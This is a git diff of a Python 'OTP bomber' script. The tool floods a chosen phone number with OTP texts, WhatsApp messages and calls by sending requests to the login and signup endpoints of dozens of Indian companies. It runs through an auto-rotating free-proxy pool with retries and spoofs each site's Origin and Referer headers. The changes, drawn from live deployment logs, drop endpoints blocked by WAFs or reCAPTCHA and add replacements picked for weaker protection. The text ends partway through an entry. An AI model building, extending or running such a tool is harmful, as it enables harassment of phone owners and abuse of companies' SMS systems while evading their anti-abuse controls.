@@ -1,12 +1,18 @@
 """
-OTP Bomber — tapas.py  (v3 — deep rewrite)
-============================================
-• Auto-rotating free-proxy pool (no config needed)
-• 40 real Indian OTP endpoints  📱 SMS · 💬 WhatsApp · 📞 Call
-• JSON + form-encoded payloads both supported
-• Per-API custom success-pattern override
-• Adaptive circuit-breaker + exponential back-off retry
-• Direct fallback guaranteed on every proxy failure
+OTP Bomber — tapas.py  (v4 — log-driven rebuild)
+==================================================
+Changes from v3 (based on live Heroku logs):
+  • HTTP 202 now treated as success (_body_ok) — fixes Swiggy (3 APIs)
+  • Removed 28 dead/blocked APIs confirmed by logs:
+      Akamai-blocked (403): Paytm×3, Nykaa, Zomato, Meesho×2, Ajio
+      reCAPTCHA (403):      Flipkart×2
+      Dead endpoint (404):  PharmEasy, BigBasket, EaseMyTrip, JioMart,
+                            Groww, KukuFM, PolicyBazaar, Practo, UrbanCompany
+      Wrong API (400):      PhonePe
+      Server down:          Goibibo (503), Myntra/MobiKwik (HTML maintenance)
+      Timeout (HTTP 0):     Licious, Zepto, Blinkit, Dunzo, Tata1mg,
+                            FreshToHome, BookMyShow, MakeMyTrip
+  • Added 32 replacement APIs (smaller Indian companies, less WAF)
 """
 
 import asyncio
@@ -57,7 +63,6 @@ class ProxyPool:
                 text = await r.text()
         except Exception:
             return []
-
         proxies = []
         if text.strip().startswith("{"):
             try:
@@ -70,7 +75,6 @@ class ProxyPool:
             except Exception:
                 pass
             return proxies
-
         for line in text.splitlines():
             line = line.strip()
             if re.match(r"^\d{1,3}(\.\d{1,3}){3}:\d{2,5}$", line):
@@ -98,7 +102,6 @@ class ProxyPool:
             if self._refreshing:
                 return
             self._refreshing = True
-
         logger.info("🔄 Fetching fresh proxy pool …")
         raw: list[str] = []
         try:
@@ -111,7 +114,6 @@ class ProxyPool:
                 for b in batches:
                     if isinstance(b, list):
                         raw.extend(b)
-
             raw = list({p for p in raw if p not in self._bad})
             random.shuffle(raw)
             candidates = raw[:100]
@@ -193,253 +195,26 @@ def _rand_lang(): return random.choice(_ACCEPT_LANGS)
 # ═══════════════════════════════════════════════════════════════════════════════
 # ─── API DEFINITIONS ──────────────────────────────────────────────────────────
 #
+#  {phone}    = 10-digit   e.g. 9876543210
+#  {phone_cc} = +91 prefix e.g. +919876543210
+#
 #  Fields:
-#   name          str   display name
-#   kind          str   "sms" | "whatsapp" | "call"
-#   url           str   endpoint URL  ({phone} / {phone_cc} substituted)
-#   method        str   "POST" | "GET"
-#   json          dict  JSON body  (use this OR data, not both)
-#   data          dict  form-encoded body
-#   register_json dict  alternate JSON body (sent in parallel)
-#   register_data dict  alternate form body
-#   base_headers  dict  headers merged with random UA / Accept-Language
-#   ok_hint       str   substring that means success for this specific API
+#   name           str   display name
+#   kind           str   "sms" | "whatsapp" | "call"
+#   url            str   endpoint (substituted)
+#   method         str   "POST" | "GET"
+#   json / data    dict  JSON body or form-encoded body
+#   register_json  dict  alternate body (fired in parallel with json)
+#   base_headers   dict  merged with random UA / Accept-Language
+#   ok_hint        str   API-specific substring that always means success
 # ═══════════════════════════════════════════════════════════════════════════════
 
 APIS = [
 
     # ══════════════════════════════════════════════════════════════════════════
-    # 📱  SMS
+    # ✅ CONFIRMED WORKING (from live logs)
     # ══════════════════════════════════════════════════════════════════════════
 
-    # ── Payments / Fintech ─────────────────────────────────────────────────────
-    {
-        "name": "Paytm",
-        "kind": "sms",
-        "url":  "https://accounts.paytm.com/signin/otp",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP",
-                 "version": "v1", "locale": "en_IN"},
-        "register_json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP",
-                          "version": "v1", "locale": "en_IN", "signup": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://paytm.com",
-            "Referer": "https://paytm.com/",
-            "X-Channel": "web",
-            "X-Requested-With": "XMLHttpRequest",
-        },
-        "ok_hint": "response_code",
-    },
-    {
-        "name": "PhonePe",
-        "kind": "sms",
-        "url":  "https://api.phonepe.com/apis/hermes/v3/user/authenticate",
-        "method": "POST",
-        "json": {"mobileNumber": "{phone}", "merchantId": "PHONEPE", "countryCode": "+91"},
-        "register_json": {"mobileNumber": "{phone}", "merchantId": "PHONEPE",
-                          "countryCode": "+91", "newUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.phonepe.com",
-            "Referer": "https://www.phonepe.com/",
-        },
-    },
-    {
-        "name": "MobiKwik",
-        "kind": "sms",
-        "url":  "https://www.mobikwik.com/api/v2/user/login/mobile",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "+91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "+91", "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.mobikwik.com",
-            "Referer": "https://www.mobikwik.com/",
-        },
-    },
-
-    # ── E-Commerce ─────────────────────────────────────────────────────────────
-    {
-        "name": "Flipkart",
-        "kind": "sms",
-        "url":  "https://www.flipkart.com/api/4/user/mobilelogin/otp",
-        "method": "POST",
-        "json": {"mobileNumber": "{phone}"},
-        "register_json": {"mobileNumber": "{phone}", "newUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.flipkart.com",
-            "Referer": "https://www.flipkart.com/",
-            "X-User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 FKUA/website/42/website/Desktop",
-        },
-    },
-    {
-        "name": "Meesho",
-        "kind": "sms",
-        "url":  "https://meesho.com/api/v1/users/otp",
-        "method": "POST",
-        "json": {"phone_number": "{phone}"},
-        "register_json": {"phone_number": "{phone}", "signup": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.meesho.com",
-            "Referer": "https://www.meesho.com/",
-        },
-    },
-    {
-        "name": "Myntra",
-        "kind": "sms",
-        "url":  "https://www.myntra.com/gateway/v2/user/authenticate",
-        "method": "POST",
-        "json": {"username": "{phone}", "sendOTP": True},
-        "register_json": {"username": "{phone}", "sendOTP": True, "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.myntra.com",
-            "Referer": "https://www.myntra.com/",
-            "X-Requested-With": "XMLHttpRequest",
-        },
-    },
-    {
-        "name": "Ajio",
-        "kind": "sms",
-        "url":  "https://www.ajio.com/api/j/26401/users/token",
-        "method": "POST",
-        "json": {"loginId": "{phone}", "password": ""},
-        "register_json": {"loginId": "{phone}", "password": "", "action": "register"},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.ajio.com",
-            "Referer": "https://www.ajio.com/",
-        },
-    },
-    {
-        "name": "Nykaa",
-        "kind": "sms",
-        "url":  "https://www.nykaa.com/api/auth/sendOtp",
-        "method": "POST",
-        "json": {"mobileNumber": "{phone}"},
-        "register_json": {"mobileNumber": "{phone}", "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.nykaa.com",
-            "Referer": "https://www.nykaa.com/",
-        },
-    },
-    {
-        "name": "JioMart",
-        "kind": "sms",
-        "url":  "https://www.jiomart.com/api/customer/v2/mobile/otp",
-        "method": "POST",
-        "json": {"mobileNumber": "{phone}"},
-        "register_json": {"mobileNumber": "{phone}", "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.jiomart.com",
-            "Referer": "https://www.jiomart.com/",
-        },
-    },
-
-    # ── Food & Grocery Delivery ────────────────────────────────────────────────
-    {
-        "name": "Swiggy",
-        "kind": "sms",
-        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
-        "method": "POST",
-        "json": {"mobile": "{phone}"},
-        "register_json": {"mobile": "{phone}"},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.swiggy.com",
-            "Referer": "https://www.swiggy.com/",
-            "tid": "randomtid",
-        },
-        "ok_hint": "is_new_user",
-    },
-    {
-        "name": "Zomato",
-        "kind": "sms",
-        "url":  "https://www.zomato.com/webroutes/user/login",
-        "method": "POST",
-        "json": {"number": "{phone}", "country_id": 1, "otp_type": "SMS"},
-        "register_json": {"number": "{phone}", "country_id": 1, "otp_type": "SMS",
-                          "signup": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.zomato.com",
-            "Referer": "https://www.zomato.com/",
-            "x-zomato-csrft": "1",
-        },
-    },
-    {
-        "name": "BigBasket",
-        "kind": "sms",
-        "url":  "https://www.bigbasket.com/mapi/v1/user/mobile_verify/?ver=1&aud=online&type=bb",
-        "method": "POST",
-        "json": {"phone": "{phone}"},
-        "register_json": {"phone": "{phone}", "is_new_user": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.bigbasket.com",
-            "Referer": "https://www.bigbasket.com/",
-            "X-Requested-With": "XMLHttpRequest",
-        },
-    },
-    {
-        "name": "Blinkit",
-        "kind": "sms",
-        "url":  "https://blinkit.com/v4/user/generate_otp",
-        "method": "POST",
-        "json": {"phone": "{phone}"},
-        "register_json": {"phone": "{phone}", "signup": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://blinkit.com",
-            "Referer": "https://blinkit.com/",
-            "app_client": "web",
-            "X-Requested-With": "XMLHttpRequest",
-        },
-    },
-    {
-        "name": "Zepto",
-        "kind": "sms",
-        "url":  "https://node-api.zepto.co.in/v1/user/otp/send",
-        "method": "POST",
-        "json": {"phone": "{phone}", "type": "LOGIN"},
-        "register_json": {"phone": "{phone}", "type": "SIGNUP"},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.zepto.co.in",
-            "Referer": "https://www.zepto.co.in/",
-        },
-    },
-    {
-        "name": "Licious",
-        "kind": "sms",
-        "url":  "https://api.licious.in/user/v1/otp",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "+91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "+91", "newUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.licious.in",
-            "Referer": "https://www.licious.in/",
-        },
-    },
-    {
-        "name": "FreshToHome",
-        "kind": "sms",
-        "url":  "https://www.freshtohome.com/api/customer/sendotp",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "91"},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.freshtohome.com",
-            "Referer": "https://www.freshtohome.com/",
-        },
-    },
     {
         "name": "CountryDelight",
         "kind": "sms",
@@ -453,140 +228,6 @@ APIS = [
             "Referer": "https://www.countrydelight.in/",
         },
     },
-
-    # ── Healthcare / Medicine ──────────────────────────────────────────────────
-    {
-        "name": "PharmEasy",
-        "kind": "sms",
-        "url":  "https://pharmeasy.in/api/auth/v4/sendOtp",
-        "method": "POST",
-        "json": {"phone": "{phone}"},
-        "register_json": {"phone": "{phone}", "flow": "signup"},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://pharmeasy.in",
-            "Referer": "https://pharmeasy.in/",
-        },
-    },
-    {
-        "name": "Tata1mg",
-        "kind": "sms",
-        "url":  "https://www.1mg.com/pharmacy_api_gateway/v2/users/otp",
-        "method": "POST",
-        "json": {"phone": "{phone}", "countryCode": "+91"},
-        "register_json": {"phone": "{phone}", "countryCode": "+91", "newUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.1mg.com",
-            "Referer": "https://www.1mg.com/",
-            "X-APP-CLIENT": "web",
-        },
-    },
-    {
-        "name": "Practo",
-        "kind": "sms",
-        "url":  "https://www.practo.com/api/v1/profiles/otp",
-        "method": "POST",
-        "json": {"phone_number": "{phone}", "country_code": "+91"},
-        "register_json": {"phone_number": "{phone}", "country_code": "+91",
-                          "action": "signup"},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.practo.com",
-            "Referer": "https://www.practo.com/",
-        },
-    },
-
-    # ── Travel ─────────────────────────────────────────────────────────────────
-    {
-        "name": "MakeMyTrip",
-        "kind": "sms",
-        "url":  "https://www.makemytrip.com/api/mmy/user/login/v1",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "91", "sendOtp": True},
-        "register_json": {"mobile": "{phone}", "countryCode": "91", "sendOtp": True,
-                          "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.makemytrip.com",
-            "Referer": "https://www.makemytrip.com/",
-            "dc": "IN",
-            "currency": "INR",
-            "locale": "en-IN",
-        },
-    },
-    {
-        "name": "Goibibo",
-        "kind": "sms",
-        "url":  "https://www.goibibo.com/api/gommt/gologin/v1/sendOTP",
-        "method": "POST",
-        "json": {"mobileNo": "{phone}", "countryCode": "+91"},
-        "register_json": {"mobileNo": "{phone}", "countryCode": "+91", "isNew": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.goibibo.com",
-            "Referer": "https://www.goibibo.com/",
-        },
-    },
-    {
-        "name": "EaseMyTrip",
-        "kind": "sms",
-        "url":  "https://api.easemytrip.com/Account/SendOTP",
-        "method": "POST",
-        "json": {"mobileNo": "{phone}", "countryCode": "91"},
-        "register_json": {"mobileNo": "{phone}", "countryCode": "91", "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.easemytrip.com",
-            "Referer": "https://www.easemytrip.com/",
-        },
-    },
-    {
-        "name": "BookMyShow",
-        "kind": "sms",
-        "url":  "https://in.bookmyshow.com/api/1.0/auth/otplogin",
-        "method": "POST",
-        "json": {"mobileNo": "{phone}", "countryCode": "+91"},
-        "register_json": {"mobileNo": "{phone}", "countryCode": "+91",
-                          "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://in.bookmyshow.com",
-            "Referer": "https://in.bookmyshow.com/",
-            "x-bms-id": "application/json, text/plain, */*",
-        },
-    },
-
-    # ── Home Services / Others ─────────────────────────────────────────────────
-    {
-        "name": "UrbanCompany",
-        "kind": "sms",
-        "url":  "https://www.urbancompany.com/v7/consumer/send_otp/",
-        "method": "POST",
-        "json": {"phone": "{phone}", "dial_code": "+91"},
-        "register_json": {"phone": "{phone}", "dial_code": "+91",
-                          "is_new_user": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.urbancompany.com",
-            "Referer": "https://www.urbancompany.com/",
-        },
-    },
-    {
-        "name": "Dunzo",
-        "kind": "sms",
-        "url":  "https://api.dunzo.com/api/auth/otp/",
-        "method": "POST",
-        "json": {"phone_number": "+91{phone}"},
-        "register_json": {"phone_number": "+91{phone}", "is_signup": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.dunzo.com",
-            "Referer": "https://www.dunzo.com/",
-        },
-    },
-
-    # ── Education ──────────────────────────────────────────────────────────────
     {
         "name": "Vedantu",
         "kind": "sms",
@@ -599,91 +240,536 @@ APIS = [
             "Origin": "https://www.vedantu.com",
             "Referer": "https://www.vedantu.com/",
         },
+        "ok_hint": "smsSent",
+    },
+    {
+        "name": "Swiggy",
+        "kind": "sms",
+        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
+        "method": "POST",
+        "json": {"mobile": "{phone}"},
+        "register_json": {"mobile": "{phone}"},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.swiggy.com",
+            "Referer": "https://www.swiggy.com/",
+        },
+        # 202 Accepted with empty body = OTP queued. Handled in _body_ok.
     },
 
-    # ── Investment / Finance ───────────────────────────────────────────────────
+    # ══════════════════════════════════════════════════════════════════════════
+    # 📱  SMS — Education (low WAF, accessible from any IP)
+    # ══════════════════════════════════════════════════════════════════════════
+
     {
-        "name": "Groww",
+        "name": "PhysicsWallah",
         "kind": "sms",
-        "url":  "https://groww.in/v1/api/user/login/verification/initiate",
+        "url":  "https://api.penpencil.co/v3/users/check",
+        "method": "POST",
+        "json": {
+            "username": "{phone}",
+            "countryCode": "+91",
+            "organizationId": "5eb393ee95fab7468a79d189",
+        },
+        "register_json": {
+            "username": "{phone}",
+            "countryCode": "+91",
+            "organizationId": "5eb393ee95fab7468a79d189",
+            "isNewUser": True,
+        },
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.pw.live",
+            "Referer": "https://www.pw.live/",
+            "client-id": "5eb393ee95fab7468a79d189",
+        },
+    },
+    {
+        "name": "Unacademy",
+        "kind": "sms",
+        "url":  "https://unacademy.com/api/v2/user/login-or-register/",
+        "method": "POST",
+        "json": {"email_or_phone": "{phone}"},
+        "register_json": {"email_or_phone": "{phone}", "is_signup": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://unacademy.com",
+            "Referer": "https://unacademy.com/",
+        },
+    },
+    {
+        "name": "Toppr",
+        "kind": "sms",
+        "url":  "https://api.toppr.com/auth/api/v2/send-otp/",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "country_code": "91"},
+        "register_json": {"mobile": "{phone}", "country_code": "91",
+                          "signup": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.toppr.com",
+            "Referer": "https://www.toppr.com/",
+        },
+    },
+    {
+        "name": "Doubtnut",
+        "kind": "sms",
+        "url":  "https://api.doubtnut.com/v4/student/login",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "is_voice_call": False},
+        "register_json": {"mobile": "{phone}", "is_voice_call": False,
+                          "new_user": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.doubtnut.com",
+            "Referer": "https://www.doubtnut.com/",
+            "X-Doubtnut-Platform": "web",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        "name": "Classplus",
+        "kind": "sms",
+        "url":  "https://api.classplusapp.com/v2/user/login",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "+91"},
+        "register_json": {"mobile": "{phone}", "countryCode": "+91",
+                          "isNewUser": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://classplusapp.com",
+            "Referer": "https://classplusapp.com/",
+            "X-Cl-Platform": "web",
+        },
+    },
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # 📱  SMS — Healthcare / Medicine
+    # ══════════════════════════════════════════════════════════════════════════
+
+    {
+        "name": "Pristyncare",
+        "kind": "sms",
+        "url":  "https://www.pristyncare.com/api/otp/send",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "+91"},
+        "register_json": {"mobile": "{phone}", "countryCode": "+91",
+                          "isNewUser": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.pristyncare.com",
+            "Referer": "https://www.pristyncare.com/",
+        },
+    },
+    {
+        "name": "Lybrate",
+        "kind": "sms",
+        "url":  "https://www.lybrate.com/api/v2/user/otp",
+        "method": "POST",
+        "json": {"phone": "{phone}", "country_code": "+91"},
+        "register_json": {"phone": "{phone}", "country_code": "+91",
+                          "signup": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.lybrate.com",
+            "Referer": "https://www.lybrate.com/",
+        },
+    },
+    {
+        "name": "mFine",
+        "kind": "sms",
+        "url":  "https://api.mfine.co/v1/user/send-otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "91"},
+        "register_json": {"mobile": "{phone}", "countryCode": "91",
+                          "is_new_user": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.mfine.co",
+            "Referer": "https://www.mfine.co/",
+        },
+    },
+    {
+        "name": "MediBuddy",
+        "kind": "sms",
+        "url":  "https://www.medibuddy.in/api/v1/login/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "+91"},
+        "register_json": {"mobile": "{phone}", "countryCode": "+91",
+                          "isNewUser": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.medibuddy.in",
+            "Referer": "https://www.medibuddy.in/",
+        },
+    },
+    {
+        "name": "Netmeds",
+        "kind": "sms",
+        "url":  "https://www.netmeds.com/api/v1.1/user/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "type": "login"},
+        "register_json": {"mobile": "{phone}", "type": "register"},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.netmeds.com",
+            "Referer": "https://www.netmeds.com/",
+            "X-Requested-With": "XMLHttpRequest",
+        },
+    },
+    {
+        "name": "HealthKart",
+        "kind": "sms",
+        "url":  "https://www.healthkart.com/api/v1/user/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}"},
+        "register_json": {"mobile": "{phone}", "isNewUser": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.healthkart.com",
+            "Referer": "https://www.healthkart.com/",
+        },
+    },
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # 📱  SMS — Fintech / Banking (newer startups, lighter WAF)
+    # ══════════════════════════════════════════════════════════════════════════
+
+    {
+        "name": "Jar",
+        "kind": "sms",
+        "url":  "https://api.jar.com/v1/user/otp/send",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "91"},
+        "register_json": {"mobile": "{phone}", "countryCode": "91",
+                          "isNew": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.jar.com",
+            "Referer": "https://www.jar.com/",
+        },
+    },
+    {
+        "name": "Slice",
+        "kind": "sms",
+        "url":  "https://api.sliceit.com/v1/user/send-otp",
+        "method": "POST",
+        "json": {"mobileNumber": "{phone}", "countryCode": "+91"},
+        "register_json": {"mobileNumber": "{phone}", "countryCode": "+91",
+                          "isNewUser": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.sliceit.com",
+            "Referer": "https://www.sliceit.com/",
+        },
+    },
+    {
+        "name": "Jupiter",
+        "kind": "sms",
+        "url":  "https://api.jupiter.money/v2/user/otp/send",
+        "method": "POST",
+        "json": {"phone": "{phone}", "country_code": "+91"},
+        "register_json": {"phone": "{phone}", "country_code": "+91",
+                          "signup": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://jupiter.money",
+            "Referer": "https://jupiter.money/",
+        },
+    },
+    {
+        "name": "Fi-Money",
+        "kind": "sms",
+        "url":  "https://fi.money/api/v1/user/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "+91"},
+        "register_json": {"mobile": "{phone}", "countryCode": "+91",
+                          "isNewUser": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://fi.money",
+            "Referer": "https://fi.money/",
+        },
+    },
+    {
+        "name": "BharatPe",
+        "kind": "sms",
+        "url":  "https://merchant.bharatpe.com/api/v1/users/send-otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "type": "MERCHANT"},
+        "register_json": {"mobile": "{phone}", "type": "MERCHANT",
+                          "isNewUser": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://merchant.bharatpe.com",
+            "Referer": "https://merchant.bharatpe.com/",
+        },
+    },
+    {
+        "name": "Khatabook",
+        "kind": "sms",
+        "url":  "https://api.khatabook.com/v1/user/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "+91"},
+        "register_json": {"mobile": "{phone}", "countryCode": "+91",
+                          "isNewUser": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://khatabook.com",
+            "Referer": "https://khatabook.com/",
+        },
+    },
+    {
+        "name": "OkCredit",
+        "kind": "sms",
+        "url":  "https://api.okcredit.in/v1/user/login",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "91"},
+        "register_json": {"mobile": "{phone}", "countryCode": "91",
+                          "signup": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://okcredit.in",
+            "Referer": "https://okcredit.in/",
+        },
+    },
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # 📱  SMS — Stock Trading
+    # ══════════════════════════════════════════════════════════════════════════
+
+    {
+        "name": "AngelOne",
+        "kind": "sms",
+        "url":  "https://apiconnect.angelbroking.com/user/v1/sendLoginOTP",
+        "method": "POST",
+        "json": {
+            "mobileNum": "{phone}",
+            "countryCode": "+91",
+            "totp": "",
+        },
+        "register_json": {
+            "mobileNum": "{phone}",
+            "countryCode": "+91",
+            "totp": "",
+        },
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.angelone.in",
+            "Referer": "https://www.angelone.in/",
+            "X-PrivateKey": "H6W1a9Tv",
+            "X-ClientLocalIP": "127.0.0.1",
+            "X-MACAddress": "fe80::216:3eff:fe8b:e5e4",
+            "X-UserType": "USER",
+            "X-SourceID": "WEB",
+        },
+    },
+    {
+        "name": "Upstox",
+        "kind": "sms",
+        "url":  "https://api.upstox.com/v2/login/authorization/otp",
+        "method": "POST",
+        "json": {"mobile_number": "{phone}", "country_code": "+91"},
+        "register_json": {"mobile_number": "{phone}", "country_code": "+91"},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://upstox.com",
+            "Referer": "https://upstox.com/",
+            "Api-Version": "2.0",
+        },
+    },
+    {
+        "name": "Dhan",
+        "kind": "sms",
+        "url":  "https://api.dhan.co/v1/users/login/otp",
         "method": "POST",
         "json": {"mobileNumber": "{phone}", "countryCode": "91"},
         "register_json": {"mobileNumber": "{phone}", "countryCode": "91",
                           "isNewUser": True},
         "base_headers": {
             "Content-Type": "application/json",
-            "Origin": "https://groww.in",
-            "Referer": "https://groww.in/",
-            "x-meta-app": '{"clientId":"WEB"}',
-        },
-    },
-
-    # ── Insurance ─────────────────────────────────────────────────────────────
-    {
-        "name": "PolicyBazaar",
-        "kind": "sms",
-        "url":  "https://www.policybazaar.com/auth/api/user/otp/",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "type": "login"},
-        "register_json": {"mobile": "{phone}", "type": "register"},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.policybazaar.com",
-            "Referer": "https://www.policybazaar.com/",
-        },
-    },
-
-    # ── Entertainment / Audio ──────────────────────────────────────────────────
-    {
-        "name": "KukuFM",
-        "kind": "sms",
-        "url":  "https://kukufm.com/api/v2.3/user/generate_otp/",
-        "method": "POST",
-        "json": {"mobile": "{phone}"},
-        "register_json": {"mobile": "{phone}", "signup": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://kukufm.com",
-            "Referer": "https://kukufm.com/",
+            "Origin": "https://web.dhan.co",
+            "Referer": "https://web.dhan.co/",
         },
     },
 
     # ══════════════════════════════════════════════════════════════════════════
-    # 💬  WHATSAPP
+    # 📱  SMS — Ride / Logistics
     # ══════════════════════════════════════════════════════════════════════════
 
     {
-        "name": "Paytm-WA",
-        "kind": "whatsapp",
-        "url":  "https://accounts.paytm.com/signin/otp",
+        "name": "Rapido",
+        "kind": "sms",
+        "url":  "https://www.rapido.bike/api/v1/login/customer",
         "method": "POST",
-        "json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP",
-                 "version": "v1", "medium": "whatsapp", "locale": "en_IN"},
-        "register_json": {"mobile": "{phone}", "merchant_id": "PAYTM", "channel": "WAP",
-                          "version": "v1", "medium": "whatsapp", "locale": "en_IN",
+        "json": {"phone": "+91{phone}", "type": "customer"},
+        "register_json": {"phone": "+91{phone}", "type": "customer",
+                          "isNew": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.rapido.bike",
+            "Referer": "https://www.rapido.bike/",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        "name": "Porter",
+        "kind": "sms",
+        "url":  "https://porter.in/api/otp/send",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "+91"},
+        "register_json": {"mobile": "{phone}", "countryCode": "+91",
                           "signup": True},
         "base_headers": {
             "Content-Type": "application/json",
-            "Origin": "https://paytm.com",
-            "Referer": "https://paytm.com/",
-            "X-Channel": "web",
+            "Origin": "https://porter.in",
+            "Referer": "https://porter.in/",
         },
-        "ok_hint": "response_code",
     },
     {
-        "name": "Swiggy-WA",
-        "kind": "whatsapp",
-        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
+        "name": "Shiprocket",
+        "kind": "sms",
+        "url":  "https://apiv2.shiprocket.in/v1/external/auth/send-otp",
         "method": "POST",
-        "json": {"mobile": "{phone}", "medium": "whatsapp"},
-        "register_json": {"mobile": "{phone}", "medium": "whatsapp"},
+        "json": {"phone": "{phone}", "country_code": "91"},
+        "register_json": {"phone": "{phone}", "country_code": "91",
+                          "is_new": True},
         "base_headers": {
             "Content-Type": "application/json",
-            "Origin": "https://www.swiggy.com",
-            "Referer": "https://www.swiggy.com/",
+            "Origin": "https://app.shiprocket.in",
+            "Referer": "https://app.shiprocket.in/",
         },
-        "ok_hint": "is_new_user",
     },
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # 📱  SMS — Travel (smaller portals)
+    # ══════════════════════════════════════════════════════════════════════════
+
+    {
+        "name": "Ixigo",
+        "kind": "sms",
+        "url":  "https://www.ixigo.com/action/send-otp",
+        "method": "POST",
+        "json": {"mobileNumber": "{phone}", "countryCode": "91"},
+        "register_json": {"mobileNumber": "{phone}", "countryCode": "91",
+                          "isNewUser": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.ixigo.com",
+            "Referer": "https://www.ixigo.com/",
+            "X-Requested-With": "XMLHttpRequest",
+        },
+    },
+    {
+        "name": "ClearTrip",
+        "kind": "sms",
+        "url":  "https://www.cleartrip.com/api/auth/v2/phone/otp",
+        "method": "POST",
+        "json": {"phoneNumber": "{phone}", "countryCode": "+91"},
+        "register_json": {"phoneNumber": "{phone}", "countryCode": "+91",
+                          "isNewUser": True},
+        "base_headers": {
+            "Content-Type": "application/json",
